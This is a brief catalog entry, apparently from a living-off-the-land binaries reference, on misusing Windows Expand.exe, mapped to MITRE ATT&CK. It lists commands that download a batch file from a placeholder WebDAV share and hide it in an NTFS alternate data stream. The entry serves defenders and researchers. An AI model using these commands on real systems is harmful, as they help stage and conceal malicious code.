## Expand.exe

* Functions: Download, Copy, Add ADS

```
expand \\webdav\folder\file.bat c:\ADS\file.bat    

expand c:\ADS\file1.bat c:\ADS\file2.bat    

expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat     
```

Acknowledgements:
* Rahmat Nurfauzi - @infosecn1nja
* Oddvar Moe - @oddvarmoe

Code sample:
*

Resources:
* https://twitter.com/infosecn1nja/status/986628482858807297
* https://twitter.com/Oddvarmoe/status/986709068759949319

Full path:
```
c:\windows\system32\Expand.exe
c:\windows\sysWOW64\Expand.exe
```

Notes:



 
MITRE ATT&CK:
* [NTFS File Attributes](https://attack.mitre.org/wiki/Technique/T1096)
* [Remote File Copy](https://attack.mitre.org/wiki/Technique/T1105)
